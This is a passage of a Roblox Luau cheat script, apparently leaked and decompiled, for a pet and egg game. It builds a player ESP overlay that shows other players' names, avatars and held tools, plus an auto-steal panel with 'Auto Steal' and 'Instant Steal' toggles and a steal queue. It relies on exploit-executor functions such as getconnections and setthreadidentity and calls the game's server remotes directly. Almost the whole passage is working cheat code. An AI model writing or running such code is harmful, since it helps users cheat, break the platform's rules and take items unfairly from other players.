				imageLabel3.ImageColor3 = Color3.fromRGB(0, 0, 0)
				imageLabel3.ImageTransparency = 0.35

				local tbl379 = {
					Player = param260,
					Highlight = highlight,
					Billboard = billboardGui,
					Avatar = imageLabel2,
					Shadow = textLabel8,
					Name = textLabel9,
					ToolShadow = imageLabel3,
					ToolIcon = createImageLabel(frame, 2),
				}

				func515(tbl379)
				return tbl379
			end

			local function func517(param261)
				if param261.NameHumanoid and param261.NameHumanoid.Parent and param261.NameDistance ~= nil then
					pcall(function()
						param261.NameHumanoid.NameDisplayDistance = param261.NameDistance
					end)
				end

				param261.NameHumanoid = nil
				param261.NameDistance = nil
			end

			local function func518(param262, obj86)
				local humanoid = obj86 and obj86:FindFirstChildOfClass("Humanoid")
				if not humanoid then
					return
				end

				if param262.NameHumanoid ~= humanoid then
					func517(param262)
					param262.NameHumanoid = humanoid
					param262.NameDistance = humanoid.NameDisplayDistance
				end

				pcall(function()
					humanoid.NameDisplayDistance = 0
				end)
			end

			local function func519(player5)
				flag2.DisconnectAll(player5.CharacterConnections)

				if player5.Tag then
					pcall(function()
						player5.Tag.Highlight:Destroy()
					end)

					pcall(function()
						player5.Tag.Billboard:Destroy()
					end)

					player5.Tag = nil
				end

				func517(player5)
				player5.Character = nil
			end

			local function func520(player6)
				if not player6.Tag or not player6.Character then
					return
				end
				local value450 = func511(player6.Character:FindFirstChildOfClass("Tool"))
				player6.Tag.ToolIcon.Image = value450
				player6.Tag.ToolShadow.Image = value450
				func515(player6.Tag)
			end

			local function func521(param263, player7, flag535)
				local image = tbl376[player7.UserId]

				if image == nil then
					local ok, result = pcall(function()
						return Players:GetUserThumbnailAsync(player7.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
					end)

					image = ok and result or ""
					tbl376[player7.UserId] = image
				end

				if flag529 and param263.Version == flag535 and param263.Tag then
					param263.Tag.Avatar.Image = image
				end
			end

			local function func522(player8, param264, character)
				func519(player8)
				player8.Version = player8.Version + 1
				local version = player8.Version
				if not flag529 or not character then
					return
				end
				player8.Character = character

				task.spawn(function()
					local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5)
					if not flag529 or player8.Version ~= version or not head or not head:IsA("BasePart") or not character:IsDescendantOf(workspace) then
						return
					end

					if not obj85 or not obj85.Parent then
						obj85 = flag2.CreateRuntime()
					end

					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					player8.Tag = func516(param264, character, head, humanoidRootPart and humanoidRootPart:IsA("BasePart") and humanoidRootPart or nil)
					func518(player8, character)

					local function func523()
						task.defer(function()
							if flag529 and player8.Version == version then
								func520(player8)
							end
						end)
					end

					table.insert(player8.CharacterConnections, character.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							func523()
						elseif child:IsA("Humanoid") then
							func518(player8, character)
						end
					end))

					table.insert(player8.CharacterConnections, character.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							func523()
						end
					end))

					table.insert(player8.CharacterConnections, character.AncestryChanged:Connect(function()
						if player8.Version == version and not character:IsDescendantOf(workspace) then
							player8.Version = player8.Version + 1
							func519(player8)
						end
					end))

					func520(player8)
					func521(player8, param264, version)
				end)
			end

			local function func524(player)
				local entry30 = tbl374[player]
				if not entry30 then
					return
				end
				entry30.Version = entry30.Version + 1
				func519(entry30)
				flag2.DisconnectAll(entry30.PlayerConnections)
				tbl374[player] = nil
			end

			local function func525(player)
				if player == localPlayer or tbl374[player] then
					return
				end

				local tbl380 = {
					Version = 0,
					Character = nil,
					Tag = nil,
					NameHumanoid = nil,
					NameDistance = nil,
					CharacterConnections = {},
					PlayerConnections = {},
				}

				tbl374[player] = tbl380

				table.insert(tbl380.PlayerConnections, player.CharacterAdded:Connect(function(character)
					func522(tbl380, player, character)
				end))

				table.insert(tbl380.PlayerConnections, player.CharacterRemoving:Connect(function(character)
					if tbl380.Character == character then
						tbl380.Version = tbl380.Version + 1
						func519(tbl380)
					end
				end))

				func522(tbl380, player, player.Character)
			end

			local function func526()
				for _, value451 in pairs(tbl374) do
					if value451.Tag then
						func515(value451.Tag)
					end
				end
			end

			local function func527()
				flag529 = false
				n22 += 1
				flag2.DisconnectAll(tbl375)
				local tbl381 = {}

				for k in pairs(tbl374) do
					table.insert(tbl381, k)
				end

				for _, item138 in ipairs(tbl381) do
					func524(item138)
				end

				if obj85 then
					obj85:Destroy()
					obj85 = nil
				end
			end

			local function func528()
				if flag529 then
					return
				end
				flag529 = true
				n22 += 1
				local flag536 = n22
				obj85 = flag2.CreateRuntime()

				for _, player in ipairs(Players:GetPlayers()) do
					func525(player)
				end

				table.insert(tbl375, Players.PlayerAdded:Connect(func525))
				table.insert(tbl375, Players.PlayerRemoving:Connect(func524))
				local currentCamera = workspace.CurrentCamera

				if currentCamera then
					table.insert(tbl375, currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func526))
				end

				task.spawn(function()
					while true do
						if flag529 and flag536 == n22 then
							task.wait(1)

							if not (not flag529 or flag536 ~= n22) then
								for k, value452 in pairs(tbl374) do
									local character = k.Character
									local adornee = value452.Tag and value452.Tag.Billboard.Parent and value452.Tag.Billboard.Adornee and value452.Tag.Billboard.Adornee:IsDescendantOf(workspace)

									if character and character:IsDescendantOf(workspace) and (value452.Character ~= character or not adornee) then
										func522(value452, k, character)
									end
								end

								continue
							end
						end

						break
					end
				end)
			end

			local function func529()
				if flag531 then
					return
				end

				if flag2.ReadToggle(value449, flag530) then
					func528()
				elseif flag529 then
					func527()
				end
			end

			func4(function()
				flag531 = true
				func527()
			end)

			value449 = espSection:CreateToggle({
				Name = "ESP Players",
				Default = false,
				Callback = function(value)
					flag530 = value == true
					flag2.SyncSoon(func529)
				end,
			})

			func6(espSection:CreateMultiDropdown({
				Name = "ESP Player Info",
				Options = { "Name", "Username", "Avatar", "Tool" },
				Default = { "Name", "Tool" },
				SubOf = value449,
				Callback = function(value)
					local tbl382 = { Name = false, Username = false, Avatar = false, Tool = false }

					if type(value) == "table" then
						for k, value453 in pairs(value) do
							if type(value453) == "string" and tbl382[value453] ~= nil then
								tbl382[value453] = true
							elseif type(k) == "string" and value453 == true and tbl382[k] ~= nil then
								tbl382[k] = true
							end
						end
					end

					tbl377 = tbl382
					func526()
				end,
			}))

			espSection:CreateSlider({
				Name = "ESP Player Size",
				Min = 50,
				Max = 200,
				Default = 75,
				Increment = 5,
				Unit = "%",
				SubOf = value449,
				Callback = function(value)
					local num123 = tonumber(value)

					if num123 and n23 ~= num123 / 100 then
						n23 = math.clamp(num123 / 100, 0.5, 2)
						func526()
					end
				end,
			})
		end

		n4 = 3
		n5 = 0.002
		n6 = 4
		n7 = 0.3
		n8 = 0.62
		n9 = 0.86
		n10 = 4.4262295081967213
		n11 = 1.392
		n12 = 1.03
		tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo2 = TweenInfo.new(0.24, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo3 = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		tweenInfo4 = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
		tweenInfo5 = TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		TweenService = game:GetService("TweenService")
		color2 = Color3.fromRGB

		func466 = function(list58)
			local tbl383 = {}

			for i, item139 in ipairs(list58) do
				tbl383[i] = ColorSequenceKeypoint.new(item139[1], item139[2])
			end

			return ColorSequence.new(tbl383)
		end

		tbl315 = {}

		do
			local hud = {}
			local tbl384 = { 0, color2(0, 118, 255) }
			local tbl385 = { 1, color2(72, 204, 255) }
			local tbl386 = { tbl384, tbl385 }
			hud.Color = func466(tbl386)
			hud.Rotation = -90
			hud.Stroke = color2(0, 28, 76)
			hud.Light = color2(172, 226, 255)
			tbl315.Hud = hud
		end

		do
			local steal = {}
			local tbl387 = { 0, color2(60, 255, 0) }
			local tbl388 = { 1, color2(136, 255, 0) }
			local tbl389 = { tbl387, tbl388 }
			steal.Color = func466(tbl389)
			steal.Rotation = -90
			steal.Stroke = color2(11, 72, 0)
			steal.Light = color2(190, 255, 180)
			tbl315.Steal = steal
		end

		do
			local queued = {}
			local tbl390 = { 0, color2(118, 118, 132) }
			local tbl391 = { 1, color2(172, 172, 186) }
			local tbl392 = { tbl390, tbl391 }
			queued.Color = func466(tbl392)
			queued.Rotation = -90
			queued.Stroke = color2(28, 28, 34)
			queued.Light = color2(214, 214, 226)
			tbl315.Queued = queued
		end

		do
			local priorityOn = {}
			local tbl393 = { 0, color2(255, 247, 0) }
			local tbl394 = { 1, color2(255, 136, 0) }
			local tbl395 = { tbl393, tbl394 }
			priorityOn.Color = func466(tbl395)
			priorityOn.Rotation = 90
			priorityOn.Stroke = color2(0, 0, 0)
			priorityOn.Light = color2(132, 112, 0)
			tbl315.PriorityOn = priorityOn
		end

		do
			local cancel = {}
			local tbl396 = { 0, color2(214, 17, 17) }
			local tbl397 = { 1, color2(253, 20, 20) }
			local tbl398 = { tbl396, tbl397 }
			cancel.Color = func466(tbl398)
			cancel.Rotation = -90
			cancel.Stroke = color2(72, 0, 0)
			cancel.Light = color2(255, 103, 103)
			tbl315.Cancel = cancel
		end

		do
			local chilli = {}
			local tbl399 = { 0, color2(132, 74, 255) }
			local tbl400 = { 0.34, color2(178, 74, 255) }
			local tbl401 = { 0.6, color2(255, 104, 206) }
			local tbl402 = { 0.78, color2(255, 168, 232) }
			local tbl403 = { 1, color2(146, 66, 255) }
			local tbl404 = { tbl399, tbl400, tbl401, tbl402, tbl403 }
			chilli.Color = func466(tbl404)
			chilli.Rotation = -115
			chilli.Stroke = color2(44, 10, 80)
			chilli.Light = color2(226, 178, 255)
			tbl315.Chilli = chilli
		end

		tbl316 = {}

		do
			local tbl405 = { 0, color2(255, 255, 255) }
			local tbl406 = { 0.2, color2(206, 212, 224) }
			local tbl407 = { 0.42, color2(74, 80, 94) }
			local tbl408 = { 0.58, color2(42, 46, 56) }
			local tbl409 = { 0.78, color2(158, 166, 182) }
			local tbl410 = { 1, color2(250, 252, 255) }
			tbl316[1] = tbl405
			tbl316[2] = tbl406
			tbl316[3] = tbl407
			tbl316[4] = tbl408
			tbl316[5] = tbl409
			tbl316[6] = tbl410
		end
	end

	local obj87, obj88

	do
		local value454 = func466(tbl316)
		local tbl411 = {}
		local rarityGradients = nil

		local function func530(param265)
			local entry31 = tbl411[param265]
			if entry31 then
				return entry31
			end
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local flag537 = type(directory) == "table" and directory[param265] or nil
			local rarity = type(flag537) == "table" and type(flag537.Rarity) == "table" and flag537.Rarity or nil
			local rarityGradient = rarity and rarity.RarityGradient or nil

			if rarity and typeof(rarityGradient) ~= "Instance" then
				if rarityGradients == nil then
					local assets = ReplicatedStorage:FindFirstChild("Assets")
					assets = assets and assets:FindFirstChild("UI")
					rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
				end

				rarityGradient = rarityGradients

				if rarityGradients then
					rarityGradient = rarityGradients:FindFirstChild(tostring(rarity._id or rarity.DisplayName or ""))
				end

				rarityGradient = rarityGradient and rarityGradient:FindFirstChild("RarityGradient") or nil
			end

			local flag538

			if rarity then
				flag538 = tostring(rarity.DisplayName or rarity._id or "")
			else
				flag538 = rarity
			end

			flag538 = flag538 or ""
			local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or color2(255, 255, 255)
			local color4 = func466({ { 0, color3 }, { 1, color3 } })
			local gradientRotation

			if string.upper(flag538) == "SECRET" then
				gradientRotation = 90
				color4 = value454
			else
				local isUIGradient = typeof(rarityGradient) == "Instance" and rarityGradient:IsA("UIGradient")
				gradientRotation = 90

				if isUIGradient then
					color4 = rarityGradient.Color
					gradientRotation = rarityGradient.Rotation
				end
			end

			local icon = type(flag537) == "table" and flag537.Icon or nil

			if tonumber(icon) then
				icon = "rbxassetid://" .. tostring(icon)
			end

			local tbl412 = {}
			local flag539 = type(flag537) == "table"
			local name

			if flag539 then
				name = tostring(flag537.DisplayName or param265)
			else
				name = flag539
			end

			tbl412.Name = name or tostring(param265)
			tbl412.Icon = icon and tostring(icon) or ""

			if rarity then
				rarity = tonumber(rarity.RarityNumber or rarity.Rank)
			end

			tbl412.RarityNumber = rarity or 0
			tbl412.GradientColor = color4
			tbl412.GradientRotation = gradientRotation
			tbl412.EarningRate = type(flag537) == "table" and tonumber(flag537.EarningRate) or 0
			tbl411[param265] = tbl412
			return tbl412
		end

		local function func531(param266, param267)
			local n13 = tonumber(param266.AssetScale) or 1
			local n14 = n13 > 5 and (n13 / 5) ^ 1.2 * 19.637875755794113 or n13 ^ 1.85
			local mutations = type(param266.Mutations) == "table" and param266.Mutations or {}

			if #mutations == 0 and type(param266.BaseMutation) == "string" and param266.BaseMutation ~= "" then
				mutations = { param266.BaseMutation }
			end

			local mutations2 = tbl1.Mutations
			local flag540 = type(mutations2) == "table" and type(mutations2.EarningsFor) == "function"
			local n15 = 1

			if flag540 then
				local ok
				ok, n15 = pcall(mutations2.EarningsFor, mutations)
				local flag541 = ok and type(n15) == "number"
				local n16 = 1

				if not flag541 then
					n15 = n16
				end
			end

			return param267.EarningRate * n14 * n15
		end

		local tbl413 = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx" }

		local function func532(param268)
			local n13 = tonumber(param268) or 0
			local n14 = 1

			while n13 >= 1000 and n14 < #tbl413 do
				n13 /= 1000
				n14 += 1
			end

			local str44 = n14 == 1 and tostring(math.floor(n13)) or string.format("%.1f", math.floor(n13 * 10) / 10)
			local str45 = tbl413[n14] .. "/s"
			return "$" .. string.gsub(str44, "%.0$", "") .. str45
		end

		local function func533(flag542, text)
			if flag542 and flag542.Text ~= text then
				flag542.Text = text
			end
		end

		local flag543 = false
		local n13 = 0
		local flag544 = false
		local value455 = nil
		local value456 = nil
		local value457 = nil
		local imageLabel = nil
		local value458 = nil
		local value459 = nil
		local position = nil
		local title = nil
		local value460 = nil
		local value461 = nil
		local value462 = nil
		local flag545 = false
		local obj89 = obj2:CreateState({ Name = "Steal Panel Open", Default = true })
		local flag546 = false
		local tween = nil
		local tween2 = nil
		local n14 = 0
		local value463 = nil
		local value464 = nil
		local n15 = 1
		local tbl414 = {}
		local tbl415 = {}
		local tbl416 = {}
		local obj = setmetatable({}, { __mode = "k" })
		local uiStroke = nil
		local thickness = nil
		local flag547 = false
		local flag548 = false
		local flag549 = false
		local value465 = nil

		local function func534()
			local playerGui = localPlayer:FindFirstChildOfClass("PlayerGui")
			local hud = playerGui and playerGui:FindFirstChild("HUD")
			local gameHUD = hud and hud:FindFirstChild("GameHUD")
			local rightButtons = gameHUD and gameHUD:FindFirstChild("RightButtons")
			local activePets = playerGui and playerGui:FindFirstChild("ActivePets")

			local tbl417 = {
				Hud = hud,
				GameHud = gameHUD,
				Column = rightButtons,
				Eggs = rightButtons and rightButtons:FindFirstChild("EggsButton"),
				Pets = rightButtons and rightButtons:FindFirstChild("PetsButton"),
				ActivePets = activePets,
				GrowingEggs = playerGui and playerGui:FindFirstChild("GrowingEggs"),
			}

			if not (hud and gameHUD and rightButtons and tbl417.Eggs and tbl417.Pets and activePets and activePets:FindFirstChild("Frame")) then
				return nil
			end
			return tbl417
		end

		local function func535(obj90)
			local ok, result = pcall(function()
				return obj90:Clone()
			end)

			if not ok or typeof(result) ~= "Instance" then
				return nil
			end

			for _, descendant in ipairs(result:GetDescendants()) do
				if descendant:IsA("LuaSourceContainer") then
					descendant:Destroy()
				end
			end

			return result
		end

		local function func536(list59)
			list59.Name = func3()

			for _, descendant in ipairs(list59:GetDescendants()) do
				descendant.Name = func3()
			end
		end

		local n16 = 2.3120369911193848
		local n17 = 556
		local n18 = 86.24
		local tbl418 = { Panel = n16, Hud = n16 }

		local function func537(param269)
			if param269 then
				local x = value459 and value459.AbsoluteSize.X or 0
				return x > 0 and n16 * x / n17 or nil
			end
			local button = value457 and value457.Button
			button = button and button.Size.X.Offset or 0
			return button > 0 and n16 * button / n18 or nil
		end

		local function func538(instance26, param270)
			local panel2 = func537(param270.Panel)

			if panel2 and instance26.Parent then
				instance26.Thickness = param270.Ratio * panel2
			end
		end

		local function func539(list60, flag550)
			local panel = flag550 and tbl418.Panel or tbl418.Hud

			if not panel or panel <= 0 then
				panel = 2.3120369911193848
			end

			for _, descendant in ipairs(list60:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					local ok, result = pcall(function()
						return descendant.StrokeSizingMode
					end)

					if not ok or result ~= Enum.StrokeSizingMode.ScaledSize then
						local tbl419 = { Ratio = descendant.Thickness / panel, Panel = flag550 == true }
						obj[descendant] = tbl419
						func538(descendant, tbl419)
					end
				end
			end
		end

		local function func540()
			for k, value466 in pairs(obj) do
				func538(k, value466)
			end
		end

		local function func541()
			func540()
		end

		local function func542(instance27)
			if not instance27 then
				return nil
			end

			return {
				Button = instance27,
				Gradient = instance27:FindFirstChildOfClass("UIGradient"),
				Stroke = instance27:FindFirstChild("UIStroke"),
				Light = instance27:FindFirstChild("UIStrokeClr"),
				Label = instance27:FindFirstChild("Label") or instance27:FindFirstChild("TextLabel"),
				Scale = instance27:FindFirstChild("BtnScale"),
			}
		end

		local function func543(flag551, style)
			if not flag551 or flag551.Style == style then
				return
			end
			flag551.Style = style

			if flag551.Gradient then
				flag551.Gradient.Color = style.Color
				flag551.Gradient.Rotation = style.Rotation
			end

			if flag551.Stroke then
				flag551.Stroke.Color = style.Stroke
			end

			if flag551.Light then
				flag551.Light.Color = style.Light
			end
		end

		local function func544(flag552)
			if not flag552 then
				return
			end
			local scale = flag552.Scale

			if not scale then
				scale = Instance.new("UIScale")
				scale.Parent = flag552.Button
				flag552.Scale = scale
			end

			local function func545(param271)
				TweenService:Create(scale, tweenInfo5, { Scale = param271 }):Play()
			end

			flag552.Button.MouseEnter:Connect(function()
				func545(1.08)
			end)

			flag552.Button.MouseLeave:Connect(function()
				func545(1)
			end)

			flag552.Button.MouseButton1Down:Connect(function()
				func545(0.94)
			end)

			flag552.Button.MouseButton1Up:Connect(function()
				func545(1.08)
			end)
		end

		local tweenInfo6 = TweenInfo.new(2.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo7 = TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local tweenInfo8 = TweenInfo.new(1.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
		local list61 = {}
		-- SOURCE LEAK (SL) // discord.gg/x7YbZeezpm

		local function func546(flag553)
			for _, item140 in ipairs(list61) do
				pcall(function()
					item140:Cancel()
				end)
			end

			table.clear(list61)
			if not flag553 then
				return
			end

			local function func547(obj91)
				list61[#list61 + 1] = obj91
				obj91:Play()
			end

			local gradient = flag553.Gradient

			if gradient then
				gradient.Rotation = -115
				gradient.Offset = Vector2.new(-0.30000001192092896, 0)
				func547(TweenService:Create(gradient, tweenInfo6, { Offset = Vector2.new(0.30000001192092896, 0) }))
				func547(TweenService:Create(gradient, tweenInfo7, { Rotation = -65 }))
			end

			local light = flag553.Light

			if light then
				light.Color = color2(226, 178, 255)
				func547(TweenService:Create(light, tweenInfo8, { Color = color2(255, 245, 255) }))
			end
		end

		local value467 = setthreadidentity or set_thread_identity

		local function func548()
			local eggState = tbl1.EggState

			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				local records = nil

				task.spawn(function()
					local ok, result = pcall(eggState.ReadFieldEggs)

					if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
						records = result.Records
					end
				end)

				if type(value467) == "function" then
					pcall(value467, 8)
				end

				if records then
					return records
				end
			end

			local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
			if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
				return nil
			end
			local flag554 = false
			local records = nil

			task.spawn(function()
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)

				if ok and type(result) == "table" and type(result.Records) == "table" then
					records = result.Records
				end

				flag554 = true
			end)

			local now = os.clock()

			while not flag554 and os.clock() - now < n6 do
				RunService.Heartbeat:Wait()
			end

			return records
		end

		local function func549()
			return value455 ~= nil and (value455.ActivePets and value455.ActivePets.Enabled or value455.GrowingEggs and value455.GrowingEggs.Enabled) or false
		end

		local function func550()
			local flag555 = false

			for _, item141 in ipairs({ value455.ActivePets, value455.GrowingEggs }) do
				if item141 and item141.Enabled then
					local frame = item141:FindFirstChild("Frame")
					frame = frame and frame:FindFirstChild("Close")
					local flag556 = frame and typeof(getconnections) == "function"
					local flag557 = false

					if flag556 then
						local ok, result = pcall(getconnections, frame.Activated)

						if ok and type(result) == "table" then
							for _, item142 in ipairs(result) do
								if pcall(function()
									item142:Fire()
								end) then
									flag557 = true
								end
							end
						end
					end

					if not flag557 then
						item141.Enabled = false
					end

					flag555 = true
				end
			end

			return flag555
		end

		local function func551(flag558, param272)
			local column = value455 and value455.Column
			if not column or not column.Parent then
				return
			end

			if tween2 then
				tween2:Cancel()
				tween2 = nil
			end

			local position2 = column.Position
			local udim2 = UDim2.new(position2.X.Scale, flag558 and math.ceil(column.AbsoluteSize.X * n12) or 0, position2.Y.Scale, position2.Y.Offset)
			if param272 then
				column.Position = udim2
				return
			end
			tween2 = TweenService:Create(column, flag558 and tweenInfo3 or tweenInfo4, { Position = udim2 })
			tween2:Play()
		end

		local n19 = 0.106
		local udim2 = UDim2.new(0.955, 0, 0.6, 0)
		local udim22 = UDim2.new(0.955 - n19, 0, 0.6, 0)
		local udim23 = UDim2.new(0.2, 0, 0.56, 0)
		local n20 = 0.955 - n19

		local function func552(flag559, visible)
			if flag559 and flag559.Button.Visible ~= visible then
				flag559.Button.Visible = visible
			end
		end

		local function func553(param273, rank, badgeStyle, flag560)
			local visible = rank ~= nil
			param273.Rank = rank
			func552(param273.Steal, not visible)
			func552(param273.Up, visible)
			func552(param273.Down, visible)
			func552(param273.Cancel, visible)

			if visible then
				func543(param273.Up, rank > 1 and tbl315.Hud or tbl315.Queued)
				func543(param273.Down, rank < (flag560 or rank) and tbl315.Hud or tbl315.Queued)
			end

			func543(param273.Star, rank == 1 and tbl315.PriorityOn or tbl315.Queued)

			if param273.Badge then
				if param273.Badge.Visible ~= visible then
					param273.Badge.Visible = visible
				end

				if visible then
					func533(param273.Badge, "#" .. rank)
					badgeStyle = badgeStyle and tbl315.Steal or tbl315.PriorityOn

					if param273.BadgeStyle ~= badgeStyle and param273.BadgeGradient then
						param273.BadgeStyle = badgeStyle
						param273.BadgeGradient.Color = badgeStyle.Color
						param273.BadgeGradient.Rotation = 90
					end
				end
			end
		end

		local function func554()
			if not value463 then
				return
			end
			local flag561 = str1.Toggle(value2, false)

			if value463.On ~= flag561 then
				value463.On = flag561
				func543(value463.Toggle, flag561 and tbl315.Steal or tbl315.Cancel)
				func533(value463.Toggle.Label, flag561 and "Auto Steal: ON" or "Auto Steal: OFF")
			end

			local guardOn = str1.SafeCarry.LineDrop == true

			if value463.Guard and value463.GuardOn ~= guardOn then
				value463.GuardOn = guardOn
				func543(value463.Guard, guardOn and tbl315.Steal or tbl315.Cancel)
				func533(value463.Guard.Label, guardOn and "Instant Steal: ON" or "Instant Steal: OFF")
			end

			if value460 and value463.SortShown ~= flag1 then
				value463.SortShown = flag1
				func533(value460.Label, "Sort: " .. tostring(flag1))
			end
		end

		local n21 = 4
		local tbl420 = {}
		local tbl421 = {}

		local function func555()
			if not value461 then
				return
			end
			func554()
			local tbl422 = {}

			for _, value468 in pairs(tbl415) do
				table.insert(tbl422, value468)
			end

			local tbl423 = {}
			local value469 = nil

			if type(str1.StealPlan) == "function" then
				task.spawn(function()
					local ok, result, result2 = pcall(str1.StealPlan)

					if ok and type(result) == "table" then
						tbl423 = result
						value469 = result2
					end
				end)
			end

			local tbl424 = {}

			for i, item143 in ipairs(tbl423) do
				if tbl424[item143] == nil then
					tbl424[item143] = i
				end
			end

			local flag562 = flag1

			table.sort(tbl422, function(param274, param275)
				local entry32 = tbl424[param274.Uid]
				local entry33 = tbl424[param275.Uid]
				if entry32 ~= nil ~= entry33 ~= nil then
					return entry32 ~= nil
				end

				if entry32 and entry33 then
					return entry32 < entry33
				end

				if flag562 == list2[1] and param274.Style.RarityNumber ~= param275.Style.RarityNumber then
					return param274.Style.RarityNumber > param275.Style.RarityNumber
				end
				local flag563 = flag562 == list2[2]
				local flag564

				if flag563 then
					flag564 = (param274.Weight or 0) ~= (param275.Weight or 0)
				else
					flag564 = flag563
				end

				if flag564 then
					return (param274.Weight or 0) > (param275.Weight or 0)
				end

				if flag562 == list2[5] and param274.Value ~= param275.Value then
					return param274.Value < param275.Value
				end

				if param274.Value ~= param275.Value then
					return param274.Value > param275.Value
				end
				return param274.Uid < param275.Uid
			end)

			local now = os.clock()
			local tbl425 = {}
			local tbl426 = {}

			for _, item144 in ipairs(tbl422) do
				local entry34 = tbl420[item144.Uid]

				if entry34 and entry34 > now and tbl421[item144.Uid] then
					table.insert(tbl426, item144)
				else
					tbl420[item144.Uid] = nil
					table.insert(tbl425, item144)
				end
			end

			table.sort(tbl426, function(param276, param277)
				return tbl421[param276.Uid] < tbl421[param277.Uid]
			end)

			for _, item145 in ipairs(tbl426) do
				table.insert(tbl425, math.clamp(tbl421[item145.Uid], 1, #tbl425 + 1), item145)
			end

			table.clear(tbl421)

			for i, item146 in ipairs(tbl425) do
				tbl421[item146.Uid] = i
				local entry35 = tbl414[item146.Uid]

				if entry35 then
					if entry35.Frame.LayoutOrder ~= i then
						entry35.Frame.LayoutOrder = i
					end

					func553(entry35, tbl424[item146.Uid], item146.Uid == value469, #tbl423)
				end
			end
		end

		local function func556()
			if not value461 then
				return
			end
			local n22 = math.max(1, math.floor(value461.AbsoluteSize.X / n10 + 0.5))
			if n22 == n14 then
				return
			end
			n14 = n22

			for _, value470 in pairs(tbl414) do
				value470.Frame.Size = UDim2.new(1, 0, 0, n22)
			end
		end

		local function func557(param278)
			local clone = value462:Clone()
			local spacer = clone:FindFirstChild("Spacer")
			local textLabel = spacer:FindFirstChild("TextLabel")

			local tbl427 = {
				Uid = param278,
				Frame = clone,
				Icon = spacer:FindFirstChild("Icon"),
				Label = textLabel,
				ValueLabel = spacer:FindFirstChild("Value"),
				DetailLabel = spacer:FindFirstChild("Detail"),
			}

			tbl427.Gradient = textLabel and textLabel:FindFirstChildOfClass("UIGradient")
			tbl427.Steal = func542(spacer:FindFirstChild("Unequip"))
			tbl427.Cancel = func542(spacer:FindFirstChild("Cancel"))
			tbl427.Star = func542(spacer:FindFirstChild("Star"))
			tbl427.Up = func542(spacer:FindFirstChild("Up"))
			tbl427.Down = func542(spacer:FindFirstChild("Down"))
			tbl427.Badge = spacer:FindFirstChild("Rank")
			tbl427.BadgeGradient = tbl427.Badge and tbl427.Badge:FindFirstChildOfClass("UIGradient") or nil

			if textLabel and not tbl427.Gradient then
				tbl427.Gradient = Instance.new("UIGradient")
				tbl427.Gradient.Parent = textLabel
			end

			func544(tbl427.Steal)
			func544(tbl427.Cancel)
			func544(tbl427.Star)
			func544(tbl427.Up)
			func544(tbl427.Down)

			for _, item147 in ipairs({ { tbl427.Up, -1 }, { tbl427.Down, 1 } }) do
				if item147[1] then
					item147[1].Button.Activated:Connect(function()
						if type(str1.MoveInPlan) == "function" then
							str1.MoveInPlan(tbl427.Uid, item147[2])
						end

						str1.UiDefer(func555)
					end)
				end
			end

			if tbl427.Steal then
				tbl427.Steal.Button.Activated:Connect(function()
					if tbl427.Rank == nil and type(str1.StealNow) == "function" then
						str1.StealNow(tbl427.Uid, false)
					end

					str1.UiDefer(func555)
				end)
			end

			if tbl427.Cancel then
				tbl427.Cancel.Button.Activated:Connect(function()
					tbl420[tbl427.Uid] = os.clock() + n21

					if type(str1.CancelSteal) == "function" then
						str1.CancelSteal(tbl427.Uid)
					end

					str1.UiDefer(func555)
				end)
			end

			if tbl427.Star then
				tbl427.Star.Button.Activated:Connect(function()
					if type(str1.PrioritizeSteal) == "function" then
						str1.PrioritizeSteal(tbl427.Uid)
					end

					str1.UiDefer(func555)
				end)
			end

			func539(clone, true)
			func536(clone)
			clone.Size = UDim2.new(1, 0, 0, math.max(n14, 1))
			clone.Visible = true
			clone.Parent = value461
			return tbl427
		end

		local function func558(param279, param280)
			local style = param280.Style

			if param279.Category ~= param280.Category then
				param279.Category = param280.Category

				if param279.Icon then
					param279.Icon.Image = style.Icon
				end

				if param279.Gradient then
					param279.Gradient.Color = style.GradientColor
					param279.Gradient.Rotation = style.GradientRotation
				end
			end

			func533(param279.Label, style.Name)
			func533(param279.ValueLabel, func532(param280.Value))
			func533(param279.DetailLabel, param280.Detail or "")
		end

		local function func559(param281)
			local n22 = tonumber(param281) or 0
			local str46 = n22 >= 1000 and string.format("%.0f", n22) or string.format("%.2f", n22)
			local flag565, flag566 = string.match(str46, "^(%-?%d+)(%.%d+)$")
			str46 = flag565 or str46
			local str47

			while true do
				local flag567
				str47, flag567 = string.gsub(str46, "^(%-?%d+)(%d%d%d)", "%1,%2")

				if flag567 ~= 0 then
					str46 = str47
				else
					break
				end
			end

			return str47 .. (flag566 or "") .. " Kg"
		end

		local function func560(param282, param283)
			local formatted18 = string.format("x%.2f", param283)
			local eggRecords = tbl1.EggRecords
			local flag568 = type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function"
			local n22 = 0

			if flag568 then
				local ok, result = pcall(eggRecords.WeightKgForScale, param282, param283)

				if ok and tonumber(result) then
					n22 = tonumber(result)
					formatted18 ..= "  " .. utf8.char(183) .. "  " .. func559(result)
				end
			end
